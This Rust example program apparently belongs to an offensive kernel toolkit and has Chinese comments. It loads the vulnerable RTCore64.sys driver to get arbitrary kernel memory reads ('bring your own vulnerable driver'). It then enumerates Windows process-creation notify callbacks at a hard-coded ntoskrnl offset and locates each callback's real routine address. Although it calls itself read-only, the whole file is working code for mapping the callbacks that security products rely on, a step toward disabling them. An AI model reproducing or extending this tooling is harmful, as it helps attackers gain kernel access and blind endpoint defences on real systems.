//! 任务 K 深度诊断：搞清 _PS_NOTIFY_ROUTINE_BLOCK 的真实 routine 偏移。
//! 对每个 occupied slot，读 ctx+0x00..0x40 的所有 QWORD，对每个像内核地址的
//! 值，再读它指向的前 16 字节，判断哪个像 x64 函数序言。
//! **只读，零写风险。**



#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::offsets::notify_routines;
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::KernelRw;

#[cfg(target_os = "windows")]
const SYS_PATH: &[u16] = &[
    'S' as u16,
    'y' as u16,
    's' as u16,
    't' as u16,
    'e' as u16,
    'm' as u16,
    '3' as u16,
    '2' as u16,
    '\\' as u16,
    'd' as u16,
    'r' as u16,
    'i' as u16,
    'v' as u16,
    'e' as u16,
    'r' as u16,
    's' as u16,
    '\\' as u16,
    'R' as u16,
    'T' as u16,
    'C' as u16,
    'o' as u16,
    'r' as u16,
    'e' as u16,
    '6' as u16,
    '4' as u16,
    '.' as u16,
    's' as u16,
    'y' as u16,
    's' as u16,
    0,
];
#[cfg(target_os = "windows")]
const SVC_NAME: &[u16] = &[
    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
];
#[cfg(target_os = "windows")]
const PSP_CREATE_PROCESS_NOTIFY_RVA: u32 = 0x4D9D70;

#[cfg(target_os = "windows")]
extern "system" {
    fn RtlAdjustPrivilege(
        privilege: u32,
        enable: i32,
        current_thread: i32,
        enabled: *mut i32,
    ) -> i32;
}
#[cfg(target_os = "windows")]
fn enable_privileges() {
    for luid in [10u32, 20u32] {
        let mut p: i32 = 0;
        unsafe { RtlAdjustPrivilege(luid, 1, 0, &mut p) };
    }
}

#[cfg(target_os = "windows")]
fn looks_like_kexec_ptr(v: u64) -> bool {
    v >= 0xFFFFF800_00000000 && (v & 0xFFFFF000_00000000) == 0xFFFFF000_00000000
}

/// 判断 16 字节是否像 x64 内核函数序言。常见开头:
///   48 89 5C 24 xx  mov [rsp+xx],rbx       (最常见)
///   40 53           push rbx
///   4C 8B DC        mov r11,rsp
///   48 83 EC xx     sub rsp,xx
///   48 8B C4        mov rax,rsp
///   55              push rbp
///   53              push rbx
///   41 54/55/56/57  push r8-r15
///   48 8B           mov (various)
#[cfg(target_os = "windows")]
fn looks_like_function_prologue(b: &[u8]) -> bool {
    if b.len() < 3 {
        return false;
    }
    // REX.W prefix (0x48) followed by common opcodes
    if b[0] == 0x48 && (b[1] == 0x89 || b[1] == 0x8B || b[1] == 0x83 || b[1] == 0x81) {
        return true;
    }
    // push reg (40-57 range: 40-4F REX, 50-57 push rax-rdi)
    if b[0] >= 0x50 && b[0] <= 0x57 {
        return true;
    }
    if b[0] == 0x40 && b[1] >= 0x50 && b[1] <= 0x57 {
        return true;
    } // REX push
      // 4C 8B (REX.WR mov r...,...)
    if b[0] == 0x4C && b[1] == 0x8B {
        return true;
    }
    // 41 5x (push r8-r15)
    if b[0] == 0x41 && b[1] >= 0x50 && b[1] <= 0x57 {
        return true;
    }
    // 4C 8B DC mov r11,rsp (very common in callbacks)
    if b[0] == 0x4C && b[1] == 0x8B {
        return true;
    }
    false
}

#[cfg(target_os = "windows")]
fn main() {
    println!(
        "[callback_struct_deep] READ-ONLY: find real routine offset in _PS_NOTIFY_ROUTINE_BLOCK"
    );
    enable_privileges();

    let (mut loaded, krw) = unsafe {
        match bootstrap_byovd(SYS_PATH, SVC_NAME) {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[FAIL] bootstrap: {}", e);
                std::process::exit(1);
            }
        }
    };
    let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap();
    let array_kva = base + PSP_CREATE_PROCESS_NOTIFY_RVA as usize;
    println!("ntoskrnl base=0x{:016x}\n", base);

    for i in 0..notify_routines::ARRAY_LEN {
        let packed = match krw.kread_u64(array_kva + i * 8) {
            Ok(v) => v,
            Err(_) => continue,
        };
        if !notify_routines::is_occupied(packed) {
            continue;
        }
        let ctx = notify_routines::unpack(packed) as usize;
        println!("=== slot[{}] ctx=0x{:016x} ===", i, ctx);

        // Dump ctx 的每个 QWORD，对像内核指针的，读它指向的 16 字节判断是否函数序言
        for off in (0..0x40).step_by(8) {
            let v = match krw.kread_u64(ctx + off) {
                Ok(v) => v,
                Err(_) => continue,
            };
            if !looks_like_kexec_ptr(v) {
                continue;
            }
            // 读 v 指向的前 16 字节
            let mut code = [0u8; 16];
            let read_ok = krw.kread(v as usize, &mut code).is_ok();
            let is_func = read_ok && looks_like_function_prologue(&code);
            let hex: String = code.iter().map(|b| format!("{:02x}", b)).collect();
            println!(
                "  ctx+0x{:02x} = 0x{:016x}  -> [{} ] {}",
                off,
                v,
                hex,
                if is_func {
                    "  <<< FUNCTION PROLOGUE (likely the real Routine)"
                } else {
                    ""
                }
            );
        }
        println!();
        if i >= 2 {
            break;
        } // 前3个 slot 够分析
    }

    println!("[callback_struct_deep] DONE");
    std::mem::forget(loaded);
}


// ----------------------------------------------------------------------------
// Non-Windows entry-point fallback (E0601 mitigation).
//
// The real `fn main()` (and every Windows-only item above) is gated by
// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
// body compiles to nothing and the build would fail with E0601 ("main
// function not found"). This stub exists solely to satisfy the crate root on
// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
// mutually exclusive with the Windows `main` above and never runs on target.
// ----------------------------------------------------------------------------
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
        env!("CARGO_BIN_NAME")
    );
}
